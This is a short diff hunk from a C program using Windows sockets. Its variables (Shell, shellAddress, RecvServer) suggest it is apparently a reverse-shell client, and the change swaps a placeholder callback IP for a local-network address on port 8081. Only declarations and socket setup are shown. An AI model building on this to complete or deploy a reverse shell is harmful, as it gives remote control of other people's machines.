@@ -75,7 +75,7 @@ int main() {
     SOCKET Shell;
     SOCKADDR_IN shellAddress;
     char RecvServer[BUFFER_SIZE];
-    char ipAddress[] = "xxx.xxx.xxx.xxx";
+    char ipAddress[] = "192.168.1.156";
     int port = 8081;
 
     WSAStartup(MAKEWORD(2, 2), &wsa);
